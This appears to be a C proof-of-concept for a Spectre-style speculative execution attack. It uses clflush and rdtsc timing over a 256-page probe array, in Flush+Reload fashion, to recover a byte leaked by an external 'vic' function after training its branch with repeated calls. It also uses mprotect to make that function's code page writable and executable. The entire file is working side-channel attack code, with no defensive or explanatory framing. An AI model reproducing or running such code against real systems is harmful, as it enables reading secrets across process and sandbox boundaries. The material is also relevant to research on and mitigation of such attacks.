#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
// // 
// #include "a.h"

size_t CACHE_MISS = 250;

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void maccess_wr(void *p, int val) { asm volatile("movq %%rax, (%1)\n" : : "a"(val), "c"(p) : ); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void mfence() { asm volatile("mfence"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void lfence() { asm volatile("lfence"); }

__attribute__((always_inline)) inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
    asm volatile("mfence");

    return (d << 32) | a;
}


extern uint8_t vic(uint8_t cond, uint16_t val);
extern char probe_array[256 * 4096];

int main(){

    mprotect(vic, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);

    // load to avoid page fault
    for(int i = 0; i < 256*4096; ++i)
        probe_array[i] = 1;


    int results[256] = {0};
    for(int try = 0; try < 1000; ++try){
        for (size_t i = 0; i < 256; i++) {
            size_t mix_i = ((i * 167) + 13) & 255;
            flush(&probe_array[mix_i * 4096]);
        }
        // for(int k = 0; k < 10; ++k)
        //     vic(((k % 9) >> 3) & 1);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        vic(1, 0xc39d);
        // flush(&probe_array[0x61 * 4096]);
        // flush(&probe_array[0x62 * 4096]);
        // mfence();
        uint8_t a = vic(0, 0x9090);
        // printf("%d\n", a);
        // printf("%d\n", ((try % 9) >> 3) & 1);
        for (size_t i = 0; i < 256; i++) {
            size_t mix_i = ((i * 167) + 13) & 255;
            uint64_t t1 = rdtsc();
            maccess(&probe_array[mix_i * 4096]);
            uint64_t t2 = rdtsc() - t1;
            if (t2 < CACHE_MISS) {
                results[mix_i]++;
            }
        }
    }

    // find top 2 max
    int j = -1,  k = -1;
    for(int i = 0; i < 256; ++i){
        if(j < 0 || results[i] >= results[j]){
            k = j;
            j = i;
        }
        else if (k < 0 || results[i] >= results[k]){
            k = i;
        }
    }

    printf("idx: %2x score: %d, second_idx:%2x, second score: %d\n", j, results[j], k, results[k]);

    // for(int i = 0; i < 100; ++i)
    //     printf("%d\n", ((i / 6) & 1) - 1);


    // asm volatile(".global check\n\
    //     check:\n\
    //     nop     \n\
    //     ");
    // int a = idx == 98;
    // printf("%d\n", a);

    return 0;
}


